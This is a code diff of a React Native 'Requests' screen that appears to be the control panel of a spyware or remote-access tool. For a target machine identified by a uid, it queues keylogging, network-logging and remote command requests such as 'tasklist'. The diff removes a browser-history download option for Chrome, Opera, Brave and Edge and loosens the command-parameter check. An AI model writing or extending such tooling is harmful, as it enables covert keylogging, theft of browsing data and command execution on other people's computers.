@@ -19,7 +19,6 @@ import {
   deleteAllData,
 } from "../components/FetchRequest";
 import { GoBackButton } from "../components/Buttons";
-import { checkCmdParam } from "../components/Errors";
 import global from "../config/global";
 import colors from "../config/colors";
 import sizes from "../config/sizes";
@@ -29,19 +28,17 @@ import sizes from "../config/sizes";
 const Requests = ({ route, navigation }) => {
   const [data, setData] = useState([]);
   const [specificData, setSpecificData] = useState([]);
-  const [browser, setBrowser] = useState("");
   const [refresh, setRefresh] = useState(true);
+  const [page, setPage] = useState(0);
+  const [maxPage, setMaxPage] = useState(5);
   const [modalVisible, setModalVisible] = useState(false);
-  const [historyModalVisible, setHistoryModalVisible] = useState(false);
   const [cmdModalVisible, setCmdModalVisible] = useState(false);
   const [cmdType, setCmpType] = useState("");
   const [cmdParam, setCmdParam] = useState("");
-  const [cmdParamError, setCmdParamError] = useState("");
   const { uid } = route.params;
   const { name } = route.params;
   const { type } = route.params;
-  const [page, setPage] = useState(0);
-  const [maxPage, setMaxPage] = useState(5);
+
 
   useEffect(() => {
     if (!refresh) return;
@@ -137,24 +134,6 @@ const Requests = ({ route, navigation }) => {
     }
   };
 
-  const setHistory = () => {
-    return (
-      <View>
-        <Picker
-          style={global.TextInput}
-          selectedValue={browser}
-          onValueChange={(itemValue, itemIndex) => setBrowser(itemValue)}
-        >
-          <Picker.Item label="Choose an option" value="" />
-          <Picker.Item label="Chrome" value="Chrome" />
-          <Picker.Item label="Opera" value="Opera" />
-          <Picker.Item label="Brave" value="Brave" />
-          <Picker.Item label="Edge" value="Edge" />
-        </Picker>
-      </View>
-    );
-  };
-
   const setCmdComponent = () => {
     return (
       <View>
@@ -172,7 +151,6 @@ const Requests = ({ route, navigation }) => {
           </Picker>
         </View>
         <View>{getAdditionalParam(cmdType)}</View>
-        <Text style={global.ErrorMsg}>{cmdParamError}</Text>
       </View>
     );
   };
@@ -196,13 +174,17 @@ const Requests = ({ route, navigation }) => {
   };
 
   const defineCmdAttributes = () => {
+    if(cmdType != "" && cmdType != "tasklist" &&  cmdParam == "") {
+      alert("Param is required");
+      return;
+    }
     let dataAttr;
     dataAttr = {
       REQUEST_TYPE: type,
       COMMAND_TYPE: cmdType,
       COMMAND_PARAMETER: cmdParam,
     };
-    if (checkCmdParam(cmdParam, setCmdParamError)) addRequest(uid, dataAttr);
+    addRequest(uid, dataAttr);
   };
 
   const checkRequestButton = () => {
@@ -210,21 +192,14 @@ const Requests = ({ route, navigation }) => {
       case "KEYLOG":
         break;
       case "NETLOG":
-        return (
-          <Pressable
-            onPress={() => setHistoryModalVisible(true)}
-            style={styles.AddRequestButton}
-          >
-            <Text style={global.ButtonText}>Download browser history</Text>
-          </Pressable>
-        );
+        break;
       case "COMMAND":
         return (
           <Pressable
             onPress={() => setCmdModalVisible(true)}
             style={styles.AddRequestButton}
           >
-            <Text style={global.ButtonText}>Add Command request</Text>
+            <Text style={global.ButtonText}>Add command request</Text>
           </Pressable>
         );
       default:
@@ -359,37 +334,6 @@ const Requests = ({ route, navigation }) => {
                     onPress={() => {
                       setModalVisible(!modalVisible);
                     }}
-                  >
-                    <Text style={global.ButtonText}>Close</Text>
-                  </Pressable>
-                </View>
-              </View>
-            </View>
-          </Modal>
-          <Modal /* Modal for History */
-            style={global.Modal}
-            animationType="fade"
-            transparent={true}
-            visible={historyModalVisible}
-            onRequestClose={() => {
-              setHistoryModalVisible(!historyModalVisible);
-            }}
-          >
-            <View style={global.ModalView}>
-              <View style={global.ModalConfigContainer}>
-                <View style={global.TopModalView}>{setHistory()}</View>
-                <View style={global.BottomModalView}>
-                  <Pressable
-                    onPress={() => {
-                      //defineTypeAttributes();
-                    }}
-                    style={global.CloseButton}
-                  >
-                    <Text style={global.ButtonText}>Send</Text>
-                  </Pressable>
-                  <Pressable
-                    style={global.CloseButton}
-                    onPress={() => setHistoryModalVisible(!historyModalVisible)}
                   >
                     <Text style={global.ButtonText}>Close</Text>
                   </Pressable>
